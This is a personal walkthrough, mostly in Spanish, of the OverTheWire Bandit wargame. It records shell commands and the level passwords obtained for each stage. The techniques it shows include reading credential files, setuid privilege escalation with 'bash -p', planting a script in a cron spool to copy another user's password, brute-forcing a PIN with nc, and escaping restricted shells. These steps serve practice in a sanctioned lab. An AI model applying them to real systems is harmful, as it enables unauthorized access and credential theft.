https://overthewire.org/wargames/bandit/bandit33.html
comandos para bash:
tr => transforma
nc => emite dato a una ip y un puerto (nc localhost 30002)
# para leer directorios con guion
cat $(pwd)/-
# archivos con separcion de espacios cat spaces\ in\ this\ filename
cat s* y darle a la tabulacion  --o podria ser-- cat *this* 
bandit2 encontrada: UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
# ls -al para ver los archivos ocultos // find / -name .h* 2>/dev/null  //fing . -name .hidden | xargs cat
bandit3 encontrado: pIwrPrtPN36QITSp3EQaw936yaFoFgAB
#flash adicionales que se pueden poner en los permisos chattr -i -V file.txt por ejemplo para ver lsattr
#find . -name -file07 | xargs cat  encontrado:koReBOKuIDDepwhWk7jZC0RTdopnAYKh
bandit5 => find . -type f -readable ! -executable -size 1033c | xargs cat | xargs
encontrado: DXjZPULLxYr17uwoI01bNLQbtFemEgo7

bandit6 => find / -type f  -size 33c -user bandit7 -group bandit6 2>/dev/null | xargs cat
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs

bandit7@bandit:~$ cat data.txt | grep millionth
millionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV

bandit8@bandit:~$ sort data.txt | uniq -u
UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR

bandit9@bandit:~$ strings data.txt | grep '\==* ' 
========== the*2i"4
========== password
Z)========== is
&========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk

bandit10@bandit:~$ base64 --decode  data.txt 
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR

bandit11@bandit:~$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu

bandit12@bandit:/tmp/ven$ mv data8.bin data8.gz
bandit12@bandit:/tmp/ven$ gzip -d data8.gz 
bandit12@bandit:/tmp/ven$ ls
data5.bin  data6.bin  data8  data.out  data.txt
bandit12@bandit:/tmp/ven$ file data8
data8: ASCII text
bandit12@bandit:/tmp/ven$ cat data8
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL

bandit13@bandit:~$ ls
sshkey.private
bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost
bandit14@bandit:~$ cat /etc/bandit_pass/bandit14
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e

bandit14@bandit:~$ nc localhost 30000
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr

andit15@bandit:~$ openssl s_client -connect localhost:30001
BfMYroe26WYalil77FoDi9qh59eK5xNr
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd

closed
bandit15@bandit:~$ 

bandit16@bandit:~$ openssl s_client -connect 127.0.0.1:31046
CONNECTED(00000003)
nos da los puertos
bandit16@bandit:~$ openssl s_client -connect 127.0.0.1:31790
nos da un cerfificado publico 
creamos un archivo en una carpeta temporal con
andit16@bandit:~$ mktemp -d
/tmp/tmp.cdOJy7lQO2
bandit16@bandit:~$ cd /tmp/tmp.cdOJy7lQO2
creamos el archivo con nano y nombre id_Rsa y permisos 600
nos conectamos al servidor con usuario bandit17 y certificado id_Rsa
bandit16@bandit:/tmp/tmp.cdOJy7lQO2$ ssh -i id_Rsa bandit17@localhost
ahora conectados como bandit17 vamos a la carpeta y vemos el pasword de este
bandit17@bandit:~$ cat /etc/bandit_pass/bandit17
xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn

bandit17@bandit:~$ diff passwords.new passwords.old
42c42
< kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
---
> w0Yfolrc5bwjS4qw5mq1nnQi6mF03bii
como nos hecha cambiamos a bash porque nos cambia a .bashrc
enancio@debian:~/scripts$ ssh bandit18@bandit.labs.overthewire.org -p 2220 bash
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit18@bandit.labs.overthewire.org's password: 
ls
readme
cat readme
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x

bandit19@bandit:~$ ./bandit20-do bash -p
bash-4.4$ whoami
bandit20
bash-4.4$ cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
bash-4.4$ 

bandit20@bandit:~$ ls
suconnect
bandit20@bandit:~$ ./suconnect
Usage: ./suconnect <portnumber>
This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.
bandit20@bandit:~$ ./suconnect 5757
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password
bandit20@bandit:~$ 

con otra consola nos conectamos como servidor
bandit20@bandit:~$ nc -nlvp 5757
listening on [any] 5757 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 40274
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr

bandit21@bandit:~$ ls -l /etc/cron.d
total 24
-rw-r--r-- 1 root root  62 May 14  2020 cronjob_bandit15_root
-rw-r--r-- 1 root root  62 Jul 11  2020 cronjob_bandit17_root
-rw-r--r-- 1 root root 120 May  7  2020 cronjob_bandit22
-rw-r--r-- 1 root root 122 May  7  2020 cronjob_bandit23
-rw-r--r-- 1 root root 120 May 14  2020 cronjob_bandit24
-rw-r--r-- 1 root root  62 May 14  2020 cronjob_bandit25_root
bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh 
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
bandit21@bandit:~$ 

bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh 
#!/bin/bash

myname=$(whoami) el error es que bandit23 no bandit22 como dice whoami
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
bandit22@bandit:~$ myname=$(whoami)
bandit22@bandit:~$ mytarget=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
bandit22@bandit:~$ echo $mytarget
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n

bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh 
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ 
tenemos que crear un scrip que lea el archivo /etc/bandit_pass/bandit24
pero despues de ejecutar lo borra
creamos una carpeta temporal con mktemp
bandit23@bandit:~$ mktemp -d
/bandit23@bandit:/$ chmod o+rwx /tmp/tmp.CJcQPAhQld
bandit23@bandit:/$ ls -l /tmp/tmp.CJcQPAhQld
total 4
-rw-r--r-- 1 bandit23 root 71 Apr 20 22:51 script.sh
bandit23@bandit:/$ cd /tmp/tmp.CJcQPAhQld
bandit23@bandit:/tmp/tmp.CJcQPAhQld$ chmod +x script.sh 
bandit23@bandit:/tmp/tmp.CJcQPAhQld$ ls -l
total 4
-rwxr-xr-x 1 bandit23 root 71 Apr 20 22:51 script.sh
bandit23@bandit:/tmp/tmp.CJcQPAhQld$ cp script.sh /var/spool/bandit24/script.sh
bandit23@bandit:/tmp/tmp.CJcQPAhQld$ watch -n1 ls -l
bandit23@bandit:/tmp/tmp.CJcQPAhQld$ cat script.sh 
#!/bin/bash

cat /etc/bandit_pass/bandit24 > //tmp/tmp.CJcQPAhQld/clave.txt

bandit23@bandit:/tmp/tmp.CJcQPAhQld$ watch -n 1 ls -l

[1]+  Stopped                 watch -n1 ls -l
bandit23@bandit:/tmp/tmp.CJcQPAhQld$ ls -al
total 2000
drwxrwxrwx 2 bandit23 root        4096 Apr 20 23:08 .
drwxrws-wt 1 root     root     2031616 Apr 20 23:08 ..
-rw-r--r-- 1 bandit24 bandit24      33 Apr 20 23:08 clave.txt
-rwxr-xr-x 1 bandit23 root          77 Apr 20 23:06 script.sh
bandit23@bandit:/tmp/tmp.CJcQPAhQld$ cat clave.txt 
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
bandit23@bandit:/tmp/tmp.CJcQPAhQld$ 


creamos un scrip en el directorio temporal con mktemp
#!/bin/bash
for i in {0000..9999}; do
        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
done
bandit24@bandit:./script.sh > data.txt
bandit24@bandit:/tmp/tmp.jLiEpvAV3C$ cat data.txt | nc localhost 30002 |grep -v -E "Wrong|Please"
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
bandit24@bandit:/tmp/tmp.jLiEpvAV3C$ 

bandit25@bandit:~$ cat /etc/passwd | grep -e bandit25 -e bandit26
bandit25:x:11025:11025:bandit level 25:/home/bandit25:/bin/bash
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext

tenemos que hacer la consola peque単a para que el comando more no actue
presionar v y seguidamente :set shell=/bin/bash  =con esto cambiamos la shell
colocamos :shell y entramos como usuario bandit26

bandit26@bandit:~$ whoami
bandit26

bandit26@bandit:~$ ls -l
total 12
-rwsr-x--- 1 bandit27 bandit26 7296 May  7  2020 bandit27-do
-rw-r----- 1 bandit26 bandit26  258 May  7  2020 text.txt
bandit26@bandit:~$ ./bandit27-do 
Run a command as another user.
  Example: ./bandit27-do id
bandit26@bandit:~$ ./bandit27-do whoami
bandit27
bandit26@bandit:~$ ./bandit27-do bash -p
bash-4.4$ whoami
bandit27
bash-4.4$ cat /etc/bandit_pass/bandit27
3ba3118a22e93127a4ed485be72ef5ea

bandit27@bandit:~$ mktemp -d
/tmp/tmp.DoorVqfZVi
bandit27@bandit:~$  cd /tmp/tmp.DoorVqfZVi
bandit27@bandit:/tmp/tmp.DoorVqfZVi$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
colocamos la contrase単a de bandit27=3ba3118a22e93127a4ed485be72ef5ea
y se nos crea el repositorio
bandit27@bandit:/tmp/tmp.DoorVqfZVi$ ls -l
total 4
drwxr-sr-x 3 bandit27 root 4096 Apr 21 19:41 repo
bandit27@bandit:/tmp/tmp.DoorVqfZVi$ cd repo/
bandit27@bandit:/tmp/tmp.DoorVqfZVi/repo$ ls -l
total 4
-rw-r--r-- 1 bandit27 root 68 Apr 21 19:41 README
bandit27@bandit:/tmp/tmp.DoorVqfZVi/repo$ cat README 
The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2
bandit27@bandit:/tmp/tmp.DoorVqfZVi/repo$ 

bandit28@bandit:~$ mktemp -d
/tmp/tmp.ABBxW0KbGB
bandit28@bandit:~$ cd /tmp/tmp.ABBxW0KbGB
bandit28@bandit:/tmp/tmp.ABBxW0KbGB$ git clone //bandit28-git@localhost/home/bandit28-git/repo
entramos la contrase単a y bajamos el repo
dentro vemos los commit con git log 
bandit28@bandit:/tmp/tmp.ABBxW0KbGB/repo$ git log -p -1
commit edd935d60906b33f0619605abd1689808ccdd5ee
Author: Morla Porla <morla@overthewire.org>
Date:   Thu May 7 20:14:49 2020 +0200

    fix info leak

diff --git a/README.md b/README.md
index 3f7cee8..5c6457b 100644
--- a/README.md
+++ b/README.md
@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
 ## credentials
 
 - username: bandit29
-- password: bbc96594b4e001778eee9975372716b2
+- password: xxxxxxxxxx
 
bandit29@bandit:~$ mktemp -d
/tmp/tmp.kR9mazalwn
bandit29@bandit:~$ cd /tmp/tmp.kR9mazalwn
bandit29@bandit:/tmp/tmp.kR9mazalwn$ git clone ssh://bandit29-git@localhost/home/bandit29-git/repo
bandit29@bandit:/tmp/tmp.kR9mazalwn/repo$ git branch
* master
bandit29@bandit:/tmp/tmp.kR9mazalwn/repo$ git branch -r
  origin/HEAD -> origin/master
  origin/dev
  origin/master
  origin/sploits-dev
bandit29@bandit:/tmp/tmp.kR9mazalwn/repo$ git checkout dev
bandit29@bandit:/tmp/tmp.kR9mazalwn/repo$ git log -p -1
-- password: <no passwords in production!>
+- password: 5b90576bedb2cc04c86a9e924ce42faf

bandit30@bandit:/tmp/tmp.fyxx7cApoK/repo$ ls -l
total 4
-rw-r--r-- 1 bandit30 root 30 Apr 21 20:21 README.md
bandit30@bandit:/tmp/tmp.fyxx7cApoK/repo$ cat README.md 
just an epmty file... muahaha
bandit30@bandit:/tmp/tmp.fyxx7cApoK/repo$ git tag
secret
bandit30@bandit:/tmp/tmp.fyxx7cApoK/repo$ git show secret 
47e603bb428404d265f59c42920d81e5

bandit31 
igual que el anterior pero hay que retocar archivo .gitignore 
hace un add . despues un commit y a continuacion un push donde nos piden la contrase単a de  bandit31
y la respuesta de git es el password de bandit 32 
56a9bf19c63d650ce78e6ec0354ee45e

bandit32 
todo lo que pones pasa a mayuscula, para cambiar la shell
hay que colocar $0 y entramos en otra shell
$ pwd
/home/bandit32
$ whoami
bandit33
$ cat /etc/bandit_pass/bandit33	
c9c3199ddf4121b10cf581a98d51caee
$ exit
y ctrol d para salir del servidor

bandit33@bandit:~$ ls
README.txt
bandit33@bandit:~$ cat README.txt 
Congratulations on solving the last level of this game!

At this moment, there are no more levels to play in this game. However, we are constantly working
on new levels and will most likely expand this game with more levels soon.
Keep an eye out for an announcement on our usual communication channels!
In the meantime, you could play some of our other wargames.

If you have an idea for an awesome new level, please let us know!
